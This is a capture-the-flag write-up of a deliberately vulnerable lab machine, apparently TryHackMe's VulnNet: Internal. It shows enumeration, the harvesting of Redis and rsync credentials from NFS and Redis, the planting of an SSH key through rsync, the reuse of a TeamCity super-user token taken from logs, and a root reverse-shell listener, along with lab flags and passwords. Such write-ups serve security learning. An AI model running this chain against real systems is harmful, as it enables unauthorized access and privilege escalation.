# IP
10.10.70.6

## Enumeration

### NMAP
Found 7 ports open on the system
```console
❯ nmap -sC -sV 10.10.129.174 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-20 17:33 IST
Nmap scan report for 10.10.129.174
Host is up (0.16s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35194/udp6  mountd
|   100005  1,2,3      46870/udp   mountd
|   100005  1,2,3      56081/tcp   mountd
|   100005  1,2,3      59845/tcp6  mountd
|   100021  1,3,4      33532/udp6  nlockmgr
|   100021  1,3,4      36451/tcp   nlockmgr
|   100021  1,3,4      37239/tcp6  nlockmgr
|   100021  1,3,4      49676/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs_acl     3 (RPC #100227)
9090/tcp filtered zeus-admin
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m56s, deviation: 1h09m16s, median: 2s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-10-20T12:04:33
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2022-10-20T14:04:33+02:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.45 seconds

```

Let's go further by enumerating the samba server

### Samba
Enumerated the Samba Service with enum4linux 
```console
❯ enum4linux -a -u "guest" -p "" 10.10.129.174 | tee enum4linux.log
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 20 17:38:47 2022

 =========================================( Target Information )=========================================

Target ........... 10.10.129.174
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.129.174 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 10.10.129.174 )===============================

Looking up status of 10.10.129.174
	VULNNET-INTERNA <00> -         B <ACTIVE>  Workstation Service
	VULNNET-INTERNA <03> -         B <ACTIVE>  Messenger Service
	VULNNET-INTERNA <20> -         B <ACTIVE>  File Server Service
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.129.174 )===================================


[+] Server 10.10.129.174 allows sessions using username 'guest', password ''


<-------snip--------->


 =================================( Share Enumeration on 10.10.129.174 )=================================


	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shares          Disk      VulnNet Business Shares
	IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            

[+] Attempting to map shares on 10.10.129.174

//10.10.129.174/print$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.129.174/shares	Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.129.174/IPC$	Mapping: N/A Listing: N/A Writing: N/A

<----snip----->

 ===============================( Getting printer info for 10.10.129.174 )===============================

Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 64 66 33 A9 C8 D5 4D B7   25 FC 31 25 C1 27 6A 50   df3...M. %.1%.'jP
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Thu Oct 20 17:39:13 2022

```

As we can see that there is share named `shares`

Connected to the open samba port for further access. 

### nfs_acl 
On listing mounts available on the system, found `/opt/conf` as the directory, which can have some important configuration file.
```console
❯ showmount -e 10.10.129.174
Export list for 10.10.129.174:
/opt/conf *
```
Mounted `10.10.129.174/opt/conf`  to the `/tmp/vulnnetinternal` directory of local machine.
```console
❯ sudo mount -t nfs 10.10.129.174:/opt/conf /tmp/vulnnetinternal
❯ ls /tmp/vulnnetinternal
hp  init  opt  profile.d  redis  vim  wildmidi
```
Read all the files in the given directories and found password for `redis` in `redis/redis.conf` (removed all the hashes).
```console
❯ cat redis/$(ls redis) | grep -v "#"
rename-command FLUSHDB ""
rename-command FLUSHALL ""
«-----snip-----» 
stop-writes-on-bgsave-error yes
rdbcompression yes
rdbchecksum yes
dbfilename dump.rdb
dir /var/lib/redis
slave-serve-stale-data yes
requirepass "B65Hx562F@ggAZ@F" «---------password for redis
slave-read-only yes
«------snip-------» 
list-max-ziplist-size -2
list-compress-depth 0
set-max-intset-entries 512
zset-max-ziplist-entries 128
zset-max-ziplist-value 64
hll-sparse-max-bytes 3000
activerehashing yes
client-output-buffer-limit normal 0 0 0
client-output-buffer-limit slave 256mb 64mb 60
client-output-buffer-limit pubsub 32mb 8mb 60
hz 10
aof-rewrite-incremental-fsync yes
```
After confirming that the port for `redis` is open on the machine, started the exploitation.

```console
❯ nmap -p 6379 10.10.129.174
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-20 18:13 IST
Nmap scan report for 10.10.129.174
Host is up (0.16s latency).

PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```



## Exploitation
### Samba
On connection found 2 directories.
```console
❯ smbclient  -N \\\\10.10.129.174\\shares  | tee smbclient.log
Try "help" to get a list of possible commands.
smb: \> l
  .                                   D        0  Tue Feb  2 14:50:09 2021
  ..                                  D        0  Tue Feb  2 14:58:11 2021
  temp                                D        0  Sat Feb  6 17:15:10 2021
  data                                D        0  Tue Feb  2 14:57:33 2021
```
In `/tmp` found 1 file `services.txt` with the flag and downloaded it.
```console
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 17:15:10 2021
  ..                                  D        0  Tue Feb  2 14:50:09 2021
  services.txt                        N       38  Sat Feb  6 17:15:09 2021

		11309648 blocks of size 1024. 3279296 blocks available
smb: \temp\> get services.txt
```
In `/data` found two files downloaded both these files for further use.
```console
smb: \temp\> cd ../data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 14:57:33 2021
  ..                                  D        0  Tue Feb  2 14:50:09 2021
  data.txt                            N       48  Tue Feb  2 14:51:18 2021
  business-req.txt                    N      190  Tue Feb  2 14:57:33 2021

		11309648 blocks of size 1024. 3279296 blocks available
smb: \data\> get data.txt
getting file \data\data.txt of size 48 as data.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \data\> get business-req.txt
getting file \data\business-req.txt of size 190 as business-req.txt (0.3 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```
Found flag in `services.txt`
```console
❯ cat services.txt
THM{0a09d51e488f5fa105d8d866a497440a}
```
### Redis
Connected to redis with `redis-cli` and found the internal flag 
```console
❯ redis-cli -h 10.10.129.174  -a  B65Hx562F@ggAZ@F
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.129.174:6379> keys *
1) "authlist"
2) "internal flag"
3) "int"
4) "marketlist"
5) "tmp"
10.10.129.174:6379> type "internal flag"
string
10.10.129.174:6379> get "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
```
Another key `authlist` found on the server in which rsync password is present.
```console
10.10.129.174:6379> type authlist
list
10.10.129.174:6379> lrange authlist 0 -1
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```
```console
❯ echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```
### Rsync
Listed for files in the rsync and found .ssh file
```console
❯ rsync -av --list-only rsync://rsync-connect@10.10.129.174:873/files  | tee rsync.log | grep -v "firefox"
Password:
receiving incremental file list
drwxr-xr-x          4,096 2021/02/01 18:21:14 .
drwxr-xr-x          4,096 2021/02/06 18:19:29 sys-internal
-rw-------             61 2021/02/06 18:19:28 sys-internal/.Xauthority
lrwxrwxrwx              9 2021/02/01 19:03:19 sys-internal/.bash_history -> /dev/null
-rw-r--r--            220 2021/02/01 18:21:14 sys-internal/.bash_logout
-rw-r--r--          3,771 2021/02/01 18:21:14 sys-internal/.bashrc
-rw-r--r--             26 2021/02/01 18:23:18 sys-internal/.dmrc
<-----------snip------------------>
drwx------          4,096 2021/02/01 18:23:23 sys-internal/.local/share/applications
drwx------          4,096 2021/02/01 19:09:55 sys-internal/.local/share/gvfs-metadata
-rw-------            220 2021/02/01 19:09:55 sys-internal/.local/share/gvfs-metadata/home
-rw-rw-r--         32,768 2021/02/01 19:09:55 sys-internal/.local/share/gvfs-metadata/home-5eeb8611.log
drwx------          4,096 2021/02/06 17:24:09 sys-internal/.local/share/nano
drwx------          4,096 2021/02/01 19:07:15 sys-internal/.mozilla
drwx------          4,096 2021/02/01 19:07:15 sys-internal/.mozilla/extensions
drwx------          4,096 2021/02/01 19:07:14 sys-internal/.mozilla/systemextensionsdev
drwxrwxr-x          4,096 2021/02/06 17:13:14 sys-internal/.ssh
drwx------          4,096 2021/02/02 16:46:16 sys-internal/.thumbnails
<---------snip------------->
drwxr-xr-x          4,096 2021/02/01 18:23:22 sys-internal/Music
drwxr-xr-x          4,096 2021/02/01 18:23:22 sys-internal/Pictures
drwxr-xr-x          4,096 2021/02/01 18:23:22 sys-internal/Public
drwxr-xr-x          4,096 2021/02/01 18:23:22 sys-internal/Templates
drwxr-xr-x          4,096 2021/02/01 18:23:22 sys-internal/Videos

sent 181 bytes  received 76,464 bytes  5,677.41 bytes/sec
total size is 41,708,382  speedup is 544.18
```

 Uploaded my `id_rsa.pub`  file as `authorized_keys`.
```console
❯ cp ~/.ssh/id_rsa.pub authorized_keys
❯ rsync -av authorized_keys  rsync://rsync-connect@10.10.129.174:873/files/sys-internal/.ssh
Password: 
sending incremental file list
authorized_keys

sent 694 bytes  received 59 bytes  167.33 bytes/sec
total size is 569  speedup is 0.76
```

### SSH
Started a ssh session with public key uploaded.
```console
❯ ssh sys-internal@10.10.129.174
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Oct 20 16:01:32 2022 from 10.0.0.20
sys-internal@vulnnet-internal:~$ whoami
sys-internal
```
Got the user flag
```console
sys-internal@vulnnet-internal:~$ cat user.txt
THM{da7c20696831f253e0afaca8b83c07ab}
```
Found `TeamCity` directory in the root folder
```console
sys-internal@vulnnet-internal:~$ ls -la /
total 533824
drwxr-xr-x  24 root root      4096 Feb  6  2021 .
drwxr-xr-x  24 root root      4096 Feb  6  2021 ..
drwxr-xr-x   2 root root      4096 Feb  2  2021 bin
drwxr-xr-x   3 root root      4096 Feb  1  2021 boot
drwx------   2 root root      4096 Feb  1  2021 .cache
drwxr-xr-x  17 root root      3720 Oct 20 14:02 dev
drwxr-xr-x 129 root root     12288 Feb  7  2021 etc
drwxr-xr-x   3 root root      4096 Feb  1  2021 home
lrwxrwxrwx   1 root root        34 Feb  1  2021 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root        33 Feb  1  2021 initrd.img.old -> boot/initrd.img-4.15.0-20-generic
drwxr-xr-x  18 root root      4096 Feb  1  2021 lib
drwxr-xr-x   2 root root      4096 Feb  1  2021 lib64
drwx------   2 root root     16384 Feb  1  2021 lost+found
drwxr-xr-x   4 root root      4096 Feb  2  2021 media
drwxr-xr-x   2 root root      4096 Feb  1  2021 mnt
drwxr-xr-x   4 root root      4096 Feb  2  2021 opt
dr-xr-xr-x 352 root root         0 Oct 20 14:02 proc
drwx------   8 root root      4096 Feb  6  2021 root
drwxr-xr-x  27 root root       880 Oct 20 16:04 run
drwxr-xr-x   2 root root      4096 Feb  2  2021 sbin
drwxr-xr-x   2 root root      4096 Feb  1  2021 srv
-rw-------   1 root root 546529280 Feb  1  2021 swapfile
dr-xr-xr-x  13 root root         0 Oct 20 14:02 sys
drwxr-xr-x  12 root root      4096 Feb  6  2021 TeamCity   «---------------------------TeamCity
drwxrwxrwt  11 root root      4096 Oct 20 14:40 tmp
drwxr-xr-x  10 root root      4096 Feb  1  2021 usr
drwxr-xr-x  13 root root      4096 Feb  1  2021 var
lrwxrwxrwx   1 root root        31 Feb  1  2021 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root        30 Feb  1  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-2
```
TeamCity is a server based application, so started checking port for the service, b.t.w. default port for TeamCity is 8111 
```console
sys-internal@vulnnet-internal:/tmp$ ss -ltp
State   Recv-Q   Send-Q           Local Address:Port             Peer Address:Port  
LISTEN  0        128              127.0.0.53%lo:domain                0.0.0.0:*     
LISTEN  0        128                    0.0.0.0:ssh                   0.0.0.0:*     
LISTEN  0        5                    127.0.0.1:ipp                   0.0.0.0:*     
LISTEN  0        50                     0.0.0.0:microsoft-ds          0.0.0.0:*     
LISTEN  0        64                     0.0.0.0:nfs                   0.0.0.0:*     
LISTEN  0        64                     0.0.0.0:36451                 0.0.0.0:*     
LISTEN  0        128                    0.0.0.0:52165                 0.0.0.0:*     
LISTEN  0        5                      0.0.0.0:rsync                 0.0.0.0:*     
LISTEN  0        50                     0.0.0.0:netbios-ssn           0.0.0.0:*     
LISTEN  0        128                    0.0.0.0:6379                  0.0.0.0:*     
LISTEN  0        128                    0.0.0.0:sunrpc                0.0.0.0:*     
LISTEN  0        128                    0.0.0.0:56081                 0.0.0.0:*     
LISTEN  0        128                    0.0.0.0:53587                 0.0.0.0:*     
LISTEN  0        128                       [::]:ssh                      [::]:*     
LISTEN  0        64                        [::]:37239                    [::]:*     
LISTEN  0        128                       [::]:34679                    [::]:*     
LISTEN  0        5                        [::1]:ipp                      [::]:*     
LISTEN  0        50                        [::]:microsoft-ds             [::]:*     
LISTEN  0        64                        [::]:nfs                      [::]:*     
LISTEN  0        50                           *:9090                        *:*     
LISTEN  0        50                           *:40675                       *:*     
LISTEN  0        128                       [::]:59845                    [::]:*     
LISTEN  0        1           [::ffff:127.0.0.1]:8105                        *:*     
LISTEN  0        5                         [::]:rsync                    [::]:*     
LISTEN  0        128                      [::1]:6379                     [::]:*     
LISTEN  0        50                        [::]:netbios-ssn              [::]:*     
LISTEN  0        50          [::ffff:127.0.0.1]:57356                       *:*     
LISTEN  0        128                       [::]:60205                    [::]:*     
LISTEN  0        100         [::ffff:127.0.0.1]:8111                        *:*      «----------- This should be TeamCity
LISTEN  0        128                       [::]:sunrpc                   [::]:*     

```
Port forwarded 8111 to my 8111 with ssh to access the login page for TeamCity.
```console
❯ ssh -L 8111:127.0.0.1:8111 sys-internal@10.10.129.174
```
The login page needs a token, token can be found in the logs for TeamCity, so searched for it.
```console
sys-internal@vulnnet-internal:/TeamCity$ grep -iR token /TeamCity/logs/ 2>/dev/null
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8982982190411876115 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8982982190411876115 (use empty username with the token as the password to access the server)
```
Using last token login and enter a reverse shell payload.<br />
**Teamcity was new for mew so I followed** [this](https://www.aldeid.com/wiki/TryHackMe-VulnNet-Internal#TeamCity) **blog**
Got a reverse shell.
```console
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.0.150] from (UNKNOWN) [10.10.129.174] 48546
bash: cannot set terminal process group (512): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f#
```
Got root flag
```console
root@vulnnet-internal:/# cat /root/root.txt
THM{e8996faea46df09dba5676dd271c60bd}
```


